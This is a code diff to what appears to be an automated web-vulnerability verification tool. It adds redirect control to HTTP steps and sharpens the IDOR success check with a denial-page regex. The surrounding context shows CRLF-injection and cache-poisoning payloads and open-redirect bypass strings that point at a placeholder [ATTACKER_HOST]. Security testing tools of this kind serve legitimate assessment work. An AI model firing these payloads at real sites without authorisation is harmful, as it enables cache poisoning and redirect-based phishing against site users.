@@ -1498,6 +1498,7 @@ class StepExecutor:
         params = req.get("params")
         data = req.get("data")
         headers = req.get("headers")
+        allow_redirects = req.get("allow_redirects", True)
 
         if not url:
             err("No URL in step request")
@@ -1515,7 +1516,7 @@ class StepExecutor:
         info(f"{method} {url[:70]}...")
         result = self._client.request(
             method=method, url=url, params=params, data=data,
-            headers=headers,
+            headers=headers, allow_redirects=allow_redirects,
         )
 
         # Default success for the audit: the HTTP exchange itself completed
@@ -3357,18 +3358,20 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
 
     import re as _re
 
-    def _get(url: str, extra_params: dict = None, extra_headers: dict = None) -> dict:
+    def _get(url: str, extra_params: dict = None, extra_headers: dict = None,
+             allow_redirects: bool = True) -> dict:
         """Build a GET request dict."""
-        r = {"method": "GET", "url": url}
+        r = {"method": "GET", "url": url, "allow_redirects": allow_redirects}
         if extra_params:
             r["params"] = extra_params
         if extra_headers:
             r["headers"] = extra_headers
         return r
 
-    def _get_param(val: str) -> dict:
+    def _get_param(val: str, allow_redirects: bool = True) -> dict:
         """Build GET to target_base with param=val."""
-        return _get(target_base, extra_params={param: val})
+        return _get(target_base, extra_params={param: val},
+                    allow_redirects=allow_redirects)
 
     def _post(url: str, data: dict = None, extra_headers: dict = None) -> dict:
         r = {"method": "POST", "url": url}
@@ -4263,12 +4266,30 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
         ]
 
     elif etype == "idor":
+        # IDOR verification needs TWO signals: the ID returns 200 AND the
+        # body doesn't look like an access-denial page. The previous
+        # 'any 200 with >20 bytes' check marked login/forbidden pages
+        # as successful IDOR hits, because those are normally 200 with
+        # HTML bodies. Now filters out common denial patterns.
+        _idor_deny_pat = _re.compile(
+            r"(?:access\s+denied|permission\s+denied|unauthori[sz]ed|"
+            r"not\s+authori[sz]ed|please\s+(?:log|sign)\s+in|"
+            r"login\s+required|forbidden)",
+            _re.I,
+        )
+
         def _idor_check(r: ExploitResult):
             if r.status_code == 200 and len(r.response_body) > 20:
-                r.success = True
-                r.confidence = 0.6
-                r.evidence = f"Got {len(r.response_body)} bytes for this ID"
-                r.false_positive_risk = "medium"
+                if _idor_deny_pat.search(r.response_body[:5000]):
+                    r.evidence = (f"HTTP 200 but response looks like a "
+                                  f"denial/login page — not IDOR")
+                    r.confidence = 0.15
+                    r.false_positive_risk = "high"
+                else:
+                    r.success = True
+                    r.confidence = 0.6
+                    r.evidence = f"Got {len(r.response_body)} bytes for this ID"
+                    r.false_positive_risk = "medium"
             elif r.status_code == 403:
                 r.evidence = "403 Forbidden — access denied for this ID"
             elif r.status_code == 404:
@@ -4612,11 +4633,16 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
             ("Cache poisoning (X-Forwarded-Host)",
              f"%0d%0aX-Forwarded-Host:%20{_sess_marker}.[ATTACKER_HOST]"),
         ]
+        # allow_redirects=False so we can read the injected Location /
+        # Set-Cookie headers directly. Following the redirect would
+        # replace r.response_headers with the TARGET's headers (no
+        # injected fields) and the validator would always miss the
+        # smoking-gun evidence.
         steps = []
         for name, payload in crlf_payloads:
             steps.append({
                 "title": f"CRLF: {name}",
-                "request": _get_param(payload),
+                "request": _get_param(payload, allow_redirects=False),
                 "validate": _crlf_check,
                 "note": f"Injecting via {name} (marker: {_sess_marker})",
                 "warning": name,
@@ -4679,16 +4705,23 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
             ("Double slash", "///[ATTACKER_HOST]/r"),
             ("Whitespace prefix", "%09//[ATTACKER_HOST]/r"),
         ]
+        # allow_redirects=False is CRITICAL for every step in this branch:
+        # the validator reads Location from r.response_headers. When we
+        # let requests follow the redirect, r.response_headers is the
+        # headers of the redirect TARGET (usually 200, no Location) and
+        # every check silently returns 'no redirect' — the walkthrough
+        # ends up looking like the bypass didn't work even on a
+        # vulnerable target.
         steps = [
             {"title": "Confirm original redirect",
-             "request": _get(target),
+             "request": _get(target, allow_redirects=False),
              "validate": _redir_check,
              "note": "Check Location header baseline"},
         ]
         for name, payload in redirect_payloads:
             steps.append({
                 "title": f"Redirect bypass: {name}",
-                "request": _get_param(payload),
+                "request": _get_param(payload, allow_redirects=False),
                 "validate": _redir_check,
                 "note": f"Testing {name} bypass → attacker host",
             })
